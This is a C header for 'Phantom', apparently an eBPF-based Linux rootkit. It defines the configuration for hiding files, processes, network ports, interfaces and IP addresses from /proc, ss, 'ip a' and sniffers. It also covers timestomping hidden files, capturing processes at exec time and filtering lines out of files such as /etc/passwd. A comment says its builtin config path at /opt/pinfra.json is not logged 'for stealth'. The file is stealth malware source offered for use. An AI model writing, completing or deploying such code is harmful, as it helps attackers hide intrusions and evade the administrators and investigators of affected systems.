/* SPDX-License-Identifier: MIT */
/*
 * config.h - Configuration management for Phantom.
 *
 * Defines structures for CLI arguments and JSON config file parsing.
 * Settings are collected in phantom_cli_config and pushed to BPF maps.
 */

#ifndef __PHANTOM_CONFIG_H
#define __PHANTOM_CONFIG_H

#include <stdbool.h>
#include <stdint.h>

/* Shared buffer size limits */
#include "phantom_limits.h"

#define MAX_TIMESTOMP_RULES 32

/*
 * struct timestomp_rule - Timestomp rule (per-file or global).
 *
 * If path is NULL, the timestamp applies to all hidden files.
 */
struct timestomp_rule {
    char *path;           /* File path (NULL for global) */
    char *timestamp;      /* Timestamp string in YYYYMMDDhhmmss format */
};

/*
 * struct file_filter_entry - Userspace file filter rule.
 *
 * Used during config parsing before pushing to BPF maps.
 */
struct file_filter_entry {
    char *path;           /* File path (e.g., "/etc/passwd") */
    char *search;         /* Search string */
    char *replace;        /* Replacement string (empty for line hide) */
    int mode;             /* FILE_FILTER_MODE_HIDE or FILE_FILTER_MODE_REPLACE */
};

/*
 * struct phantom_cli_config - Master configuration structure.
 *
 * Populated by:
 *   1. phantom_config_init() - sets defaults
 *   2. phantom_config_load_builtin() - loads from /opt/pinfra.json
 *   3. parse_args() - applies CLI overrides
 *
 * After initialization, settings are pushed to BPF maps.
 * BPF programs read the maps, not this struct.
 *
 * Fields:
 *   files/file_count        - Exact filenames to hide
 *   prefixes/prefix_count   - Filename prefixes to hide
 *   process_names/...       - Process names resolved to PIDs
 *   pids/pid_count          - Process IDs to hide
 *   ports/port_count        - Network ports to hide
 *   iface_names/iface_count - Network interfaces to hide
 *   ip_addrs/ip_count       - IP addresses to hide
 *   exec_names/...          - Processes to capture at exec time
 *   target_ppid/set_ppid    - Parent PID filter
 *   enable_*                - Feature toggles
 *   set_enable_*            - Whether user explicitly set each toggle
 */
struct phantom_cli_config {
    /* Files to hide */
    char *files[MAX_HIDDEN_FILES];
    int file_count;

    /* Filename prefixes to hide */
    char *prefixes[MAX_HIDDEN_PREFIXES];
    int prefix_count;

    /*
     * Process names to resolve via /proc.
     * Absolute paths (leading '/') match /proc/<pid>/exe exactly.
     */
    char *process_names[MAX_HIDDEN_PIDS];
    int process_name_count;

    /* Exe path prefixes to hide (LPM trie) */
    char *process_path_prefixes[MAX_HIDDEN_PROC_PATH_PREFIXES];
    int process_path_prefix_count;

    /* Process IDs to hide from /proc */
    uint32_t pids[MAX_HIDDEN_PIDS];
    int pid_count;

    /* Network ports to hide from /proc/net/tcp and ss */
    uint32_t ports[MAX_HIDDEN_PORTS];
    int port_count;

    /* Network interfaces to hide from `ip a` */
    char *iface_names[MAX_HIDDEN_IFACES];
    int iface_count;

    /* IP addresses to hide from `ip a` and network sniffers */
    char *ip_addrs[MAX_HIDDEN_IPS];
    int ip_count;

    /* Process names to capture at exec time */
    char *exec_names[MAX_HIDDEN_EXEC_NAMES];
    int exec_name_count;

    /*
     * Parent PID filter. If set, only hides resources for processes
     * whose parent PID matches this value.
     */
    uint32_t target_ppid;
    bool set_ppid;

    /* Feature enable flags */
    bool enable_files;
    bool enable_procs;
    bool enable_ports;
    bool enable_audit;
    bool enable_timestomp;
    bool enable_exec;
    bool enable_iface;
    bool enable_ip;

    /* Tracks which features were explicitly set via CLI */
    bool set_enable_files;
    bool set_enable_procs;
    bool set_enable_ports;
    bool set_enable_audit;
    bool set_enable_timestomp;
    bool set_enable_exec;
    bool set_enable_iface;
    bool set_enable_ip;

    /* File content filtering */
    struct file_filter_entry file_filters[MAX_FILE_FILTERS];
    int file_filter_count;
    bool enable_file_filter;
    bool set_enable_file_filter;

    /*
     * Processes exempt from file content filtering.
     * Entries without leading '/' matched by comm name.
     * Entries with leading '/' resolved to PIDs at apply time.
     */
    char *file_filter_exempts[MAX_FILE_FILTER_EXEMPTS];
    int file_filter_exempt_count;

    /* Timestomp rules */
    struct timestomp_rule timestomp_rules[MAX_TIMESTOMP_RULES];
    int timestomp_rule_count;
    char *global_timestomp_timestamp;  /* Global timestamp for all hidden files */
};

/*
 * phantom_config_init - Initialize config to default (empty) values.
 */
void phantom_config_init(struct phantom_cli_config *cfg);

/*
 * phantom_config_free - Release memory allocated by config functions.
 */
void phantom_config_free(struct phantom_cli_config *cfg);

/*
 * phantom_config_load_file - Load settings from a JSON file.
 *
 * Strings are duplicated (strdup'd) into the config.
 * Returns 0 on success, non-zero on error.
 */
int phantom_config_load_file(const char *path, struct phantom_cli_config *cfg);

/*
 * phantom_config_load_builtin - Load config from PHANTOM_CONFIG_PATH.
 *
 * Defaults to /opt/pinfra.json. Silently succeeds if file doesn't exist.
 * Does not log the path for stealth.
 */
int phantom_config_load_builtin(struct phantom_cli_config *cfg);

/*
 * phantom_config_resolve_processes - Convert process names to PIDs.
 *
 * Looks up each name in /proc and adds resolved PIDs to hidden_pids.
 * Duplicate PIDs are skipped.
 */
int phantom_config_resolve_processes(struct phantom_cli_config *cfg);

/*
 * phantom_config_validate_file_filters - Ensure at most one filter per path.
 *
 * The BPF map is keyed by file path, so duplicate paths would silently
 * overwrite. Returns 0 if valid, -1 if duplicates found.
 */
int phantom_config_validate_file_filters(const struct phantom_cli_config *cfg);

#endif /* __PHANTOM_CONFIG_H */
